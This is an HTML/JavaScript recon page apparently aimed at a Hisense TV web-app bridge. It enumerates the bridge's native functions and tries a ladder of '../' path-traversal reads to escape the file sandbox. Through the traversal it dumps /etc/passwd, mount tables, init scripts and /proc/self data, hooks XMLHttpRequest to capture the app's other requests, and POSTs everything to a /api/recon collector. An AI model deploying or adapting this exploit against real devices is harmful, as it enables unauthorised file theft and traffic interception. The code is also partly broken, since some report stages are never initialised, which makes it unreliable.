<!doctype html>
<!-- Recon ladder v1..v4 for 55E7QTUK / V0000.09.09D.P1001 (2026-11-08).
     Adapted from launcher/recon-55.html (09.09O.AU v1-v4). Staged POSTs to
     /api/recon (full report each stage, last-writer-wins). Read-only: probes
     are fileReads and the XHR patch is local-capture only; nothing is written
     to the TV. /etc/shadow is deliberately not dumped.
     Shape note for this build: hiutils results are {ret:bool, msg:string|object};
     on failures msg is a Node errno object ({errno,code,syscall,path}) — the
     resolved absolute path lives in msg.path, so this page keeps the RAW
     shape (String() would erase it). -->
<html><head><meta charset="utf-8"><title>recon v1..v2</title></head>
<body><pre id="out">recon v1..v2…</pre><script>
(function () {
  "use strict";
  var out = document.getElementById("out");
  var report = {
    started: new Date().toISOString(),
    ua: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: [screen.width, screen.height].join("x") + " dpr=" + (window.devicePixelRatio || ""),
    v1: {}, v2: {}
  };
  function trunc(s, n) { s = String(s == null ? "" : s); return s.length > n ? s.slice(0, n) + "…(" + s.length + ")" : s; }
  function save(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/api/recon", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
      out.textContent = out.textContent + "\n[saved " + tag + "]";
    } catch (e) { out.textContent = out.textContent + "\n[save failed " + tag + "]"; }
  }
  function line(t) { out.textContent = out.textContent + "\n" + t; }

  // raw-shape capture: msg may be string or object; keep objects as JSON, cap size
  function rawOf(msg) {
    if (typeof msg === "string") return trunc(msg, 400);
    try { return trunc(JSON.stringify(msg), 500); } catch (e) { return trunc(String(msg), 300); }
  }
  function hiCall(action, params) {
    try {
      if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
      var r = HiUtils_createRequest(action, params);
      if (r && typeof r === "object" && ("ret" in r)) {
        return { ret: r.ret, msgRaw: rawOf(r.msg),
                 ok: (typeof r.ret !== "undefined" && typeof r.ret !== "string" && typeof r.ret !== "number") ? !!r.ret : (r.ret === true || (typeof r.ret === "number" && r.ret !== 0) || (typeof r.ret === "string" && r.ret !== "" && r.ret !== "0")) };
      }
      return { value: rawOf(r) };
    } catch (e) { return { exception: String(e) }; }
  }
  function rd(path, mode) {
    var r = hiCall("fileRead", { path: path, mode: (mode || 6) });
    r.path = path;
    return r;
  }

  // ---------- v1: bridge enumeration + UA + sandbox ----------
  function v1() {
    var fns = [], hi = [], web = [];
    try {
      var ks = Object.keys(window);
      for (var i = 0; i < ks.length; i++) {
        var k = ks[i], v = window[k];
        if (typeof v !== "function") continue;
        if (/^Hisense_/.test(k)) fns.push(k);
        else if (/^Hi[A-Z]/.test(k)) hi.push(k);
        else if (/^WebSDK_/.test(k)) web.push(k);
      }
    } catch (e) { report.v1.enum_error = String(e); }
    report.v1.hisense_fns = fns;
    report.v1.hi_utils_fns = hi;
    report.v1.websdk_fns = web;
    report.v1.bridge_present = (typeof HiUtils_createRequest === "function");
    // sandbox probes: real registry file (created by the install), dir, missing, absolute
    report.v1.probe_appinfo = rd("websdk/Appinfo.json");
    report.v1.probe_dot = rd("./");
    report.v1.probe_missing = rd("zzz-nonexistent-probe.txt");
    report.v1.probe_abs_passwd = rd("/etc/passwd");
    line("v1: hisense=" + fns.length + " hi=" + hi.length + " websdk=" + web.length +
         " bridge=" + report.v1.bridge_present);
    save("v1");
  }

  // ---------- v2: errno leak + ../ traversal ----------
  var P = null; // traversal prefix that reaches / across the join, if any
  function v2() {
    // absolute paths: joined onto the base or allowed through? (also the leak test)
    report.v2.abs_passwd = rd("/etc/passwd");
    report.v2.abs_missing = rd("/zzz-not-here");
    var ladder = ["../etc/passwd", "../../etc/passwd", "../../../../etc/passwd",
                  "../../../../../../../../etc/passwd", "../..//etc/passwd",
                  "websdk/../../../../etc/passwd"];
    for (var i = 0; i < ladder.length; i++) {
      var r = rd(ladder[i]);
      report.v2["ladder_" + i] = { path: ladder[i], ok: !!r.ok, ret: r.ret,
                                   msg: r.msgRaw, err: r.exception || r.error || null };
      if (r.ok && P === null) P = ladder[i].replace("etc/passwd", "");
    }
    // dir-read behavior at the base and through the working prefix
    report.v2.dir_base = rd("websdk");
    if (P !== null) report.v2.dir_ecthru = rd(P + "etc");
    line("v2: prefix=" + JSON.stringify(P) +
         (" abs_ok=" + !!report.v2.abs_passwd.ok));
    line("v2 detail: " + rawOf((report.v2.abs_passwd && report.v2.abs_passwd.msgRaw) ? report.v2.abs_passwd.msgRaw : null));
    save("v2");
    save("end");
  }

  try { v1(); } catch (e) { report.v1.fatal = String(e); save("v1-fatal"); }
  setTimeout(function () { try { v2(); } catch (e) { report.v2.fatal = String(e); save("v2-fatal"); } }, 2000);

  // ---------- v3: dumps (read-only; shadow NOT dumped) ----------
  var DUMPS = ["proc/mounts", "etc/inittab", "etc/passwd",
               "etc/init.d/rcS", "etc/rc.local", "etc/profile"];
  function v3() {
    if (P === null) { report.v3.skipped = "no traversal found in v2"; save("v3"); return; }
    report.v3 = { prefix: P, dumps: {} };
    for (var i = 0; i < DUMPS.length; i++) {
      var r = rd(P + DUMPS[i]);
      report.v3.dumps[DUMPS[i]] = { path: P + DUMPS[i], ok: !!r.ok, ret: r.ret,
                                    body: r.ok ? r.msgRaw : null,
                                    err: r.ok ? null : r.msgRaw };
      line("v3: " + DUMPS[i] + (r.ok ? " ok(" + r.msgRaw.length + "b)" : " fail " + trunc(r.msgRaw, 100)));
    }
    save("v3");
  }

  // ---------- v4: wire capture + self procs ----------
  var wire = [];
  function v4() {
    try {
      var o = XMLHttpRequest.prototype.open, s = XMLHttpRequest.prototype.send;
      XMLHttpRequest.prototype.open = function (m, u) {
        this.__alv = { m: m, u: String(u) };
        return o.apply(this, arguments);
      };
      XMLHttpRequest.prototype.send = function (b) {
        if (this.__alv && this.__alv.u.indexOf("/api/recon") === -1) {
          wire.push({ m: this.__alv.m, u: trunc(this.__alv.u, 300),
                      body: trunc((b == null ? null : (typeof b === "string" ? b : "(binary)")), 4000) });
        }
        return s.apply(this, arguments);
      };
      report.v4.patched = true;
    } catch (e) { report.v4.patch_error = String(e); }
    // stir the bridge so the XHR hook sees a live call
    var stir = rd("websdk/Appinfo.json");
    report.v4.stir_ok = !!stir.ok;
    setTimeout(function () {
      report.v4.wire = wire;
      var pre = (P === null ? "" : P);
      report.v4.self_cmdline = rd(pre + "proc/self/cmdline");
      report.v4.self_status = rd(pre + "proc/self/status");
      report.v4.cmdline = report.v4.self_cmdline.ok ? report.v4.self_cmdline.msgRaw
                                                    : ("FAIL " + report.v4.self_cmdline.msgRaw);
      report.v4.status = report.v4.self_status.ok ? report.v4.self_status.msgRaw
                                                  : ("FAIL " + report.v4.self_status.msgRaw);
      line("v4: wire=" + wire.length + " cmdline.ok=" + !!report.v4.self_cmdline.ok +
           " status.ok=" + !!report.v4.self_status.ok);
      save("v4");
      save("end");
    }, 2600);
  }

  setTimeout(function () { try { v3(); } catch (e) { report.v3.fatal = String(e); save("v3-fatal"); } }, 4500);
  setTimeout(v4, 6500);
})();
</script></body></html>
